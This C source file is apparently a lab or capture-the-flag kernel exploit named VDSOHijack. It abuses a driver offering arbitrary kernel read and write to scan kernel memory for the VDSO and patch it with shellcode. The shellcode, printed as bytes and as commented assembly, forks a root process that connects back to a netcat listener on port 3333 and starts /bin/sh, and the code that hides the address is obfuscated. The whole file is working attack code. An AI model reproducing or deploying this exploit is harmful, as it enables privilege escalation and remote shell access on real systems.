#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/auxv.h>
#include <errno.h>

#define CHANGE_POINT 0x100000   // Command to change the memory address for reading/writing
#define RW_READ 0x100001        // Command to read from the specified memory address
#define RW_WRITE 0x100002       // Command to write to the specified memory address
#define SET_MEM 0X100003        // Command to set memory-related parameters or options


// Structure to hold information for memory manipulation in a target process,
// including the address to access, the size of the data, and the target process ID
struct vunl {
    char *point;    // Memory address in the target process for read/write operations
    size_t size;    // Size of the memory region to be accessed
    pid_t pid;      // Process ID of the target process to interact with
} VUNL;

/*
    nop     
    push    rbx
    xor     rax, rax
    mov     al, 0x66
    syscall 
    xor     rbx, rbx
    cmp     rbx, rax
    jne     0x20
    xor     rax, rax
    mov     al, 0x39
    syscall 
    xor     rbx, rbx
    cmp     rax, rbx
    je      0x29
    pop     rbx
    xor     rax, rax
    mov     al, 0x60
    syscall 
    ret     
    xor     rdx, rdx
    push    1
    pop     rsi
    push    2
    pop     rdi
    push    0x29
    pop     rax
    syscall 
    xchg    rax, rdi
    push    rax
    movabs  rcx, 0xfeffff80faf2fffd
    not     rcx
    push    rcx
    mov     rsi, rsp
    push    0x10
    pop     rdx
    push    0x2a
    pop     rax
    syscall 
    xor     rbx, rbx
    cmp     rax, rbx
    je      0x62
    xor     rax, rax
    mov     al, 0xe7
    syscall 
    nop     
    push    3
    pop     rsi
    push    0x21
    pop     rax
    dec     rsi
    syscall 
    jne     0x66
    xor     rax, rax
    push    rax
    movabs  rbx, 0xff978cd091969dd0
    not     rbx
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    xor     rdx, rdx
    mov     al, 0x3b
    syscall 
    xor     rax, rax
    mov     al, 0xe7
    syscall 
*/

char shellcode[] =  "\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75"
                    "\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09"
                    "\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A"
                    "\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA"
                    "\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A"
                    "\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7"
                    "\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6"
                    "\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7"
                    "\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F"
                    "\x05\x48\x31\xC0\xB0\xE7\x0F\x05";


// Function to leak memory addresses from the target process's memory
char *leak_data(int fd, char *buf)
{
    // Check for a valid file descriptor
    if (fd < 0) {
        printf("Invalid file descriptor (%d: %s)\n", errno, strerror(errno));
        return NULL;
    }

    char *res = NULL;      // Initialize result to store the found address
    VUNL.size = 0x1000;    // Set the size of memory to read
    int printed_error = 0; // Flag to track error messages

    // Iterate over addresses
    for (size_t addr = 0xffffffff80000000; addr < 0xffffffffffffffff; addr += 0x1000) {
        // Set the address for the current iteration
        VUNL.point = (char *)addr;

        // Try to change the read point
        if (ioctl(fd, CHANGE_POINT, &VUNL) < 0) {
            if (!printed_error) {
                printf("Failed to change point in leak_data (%d: %s)\n", errno, strerror(errno));
                printed_error = 1; // Prevent repeated error messages
            }
            continue; // Skip to the next address if changing fails
        }

        // Attempt to read data from memory
        if (ioctl(fd, RW_READ, buf) < 0) {
            if (!printed_error) {
                printf("Failed to read in leak_data (%d: %s)\n", errno, strerror(errno));
                printed_error = 1; // Prevent repeated error messages
            }
            continue; // Skip to the next address if reading fails
        }

        // Print the address and context
        printf("Address is: %p, context is: 0x%lx\n", VUNL.point, *(size_t *)buf);

        // Check if the target string is found
        if (!strcmp("gettimeofday", buf + 0x2b5)) {
            // Store the address if found
            res = (char *)addr;
            break;
        }

        puts("Not found, try again!\n");
    }
    return res;
}

// Function to check if the shellcode has been successfully injected into the VDSO Object
int check_vdso_shellcode()
{
    // Initialize address variable
    size_t addr = 0;
    // Retrieve VDSO address
    addr = getauxval(AT_SYSINFO_EHDR);
    if (addr < 0) {
        printf("Cannot get VDSO address (%d: %s)\n", errno, strerror(errno));
        return 0;
    }
    // Print the VDSO address
    printf("usr::VDSO address is: 0x%lx\n", addr);

    // Check for shellcode
    if (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode))) {
        return 1; // Return 1 if shellcode is found
    }
    return 0; // Return 0 if not found
}

int main(int argc, char *argv[])
{
    if (argc != 2) {
        printf("Usage: VDSOHijack <PID>\n");
        return 1;
    }

    // Convert provided PID from string to integer
    VUNL.pid = atoi(argv[1]);
    if (VUNL.pid <= 0) {
        printf("Invalid PID (%d: %s)\n", errno, strerror(errno));
        return 1;
    }

    int fd = 0; // File descriptor for the device

    // Open the device for read/write
    fd = open("/dev/rw_any_dev", O_RDWR);
    if (fd < 0) {
        printf("Failed to open device (%d: %s)\n", errno, strerror(errno));
    }

    // Allocate memory for reading data
    char *buf = malloc(0x1000);
    if (buf == NULL) {
        printf("Failed to allocate memory for buffer (%d: %s)\n", errno, strerror(errno));
    }

    VUNL.point = (char *)leak_data(fd, buf); // Leak data and get memory address
    VUNL.size = strlen(shellcode);           // Set size for shellcode
    VUNL.point = VUNL.point + 0xb00;         // Adjust the address for injection

    // Change the read/write point
    if (ioctl(fd, CHANGE_POINT, &VUNL) < 0) {
        printf("Failed to change point before writing shellcode (%d: %s)\n", errno, strerror(errno));
    }

    // Write the shellcode to memory
    if (ioctl(fd, RW_WRITE, shellcode) < 0) {
        printf("Failed to write shellcode (%d: %s)\n", errno, strerror(errno));
    }

    // Print the hook address
    printf("Hook in %p\n", VUNL.point);
    
    // Verify if the shellcode is hooked
    if (check_vdso_shellcode()) {
        puts("The shellcode has hook in VDSO");
        system("nc -lp 3333"); // Start a netcat listener
    }
    else {
        printf("Error occurred (%d: %s)\n", errno, strerror(errno));
    }

    free(buf);  // Free allocated memory
    close(fd);  // Close file descriptor

    return 0;
}
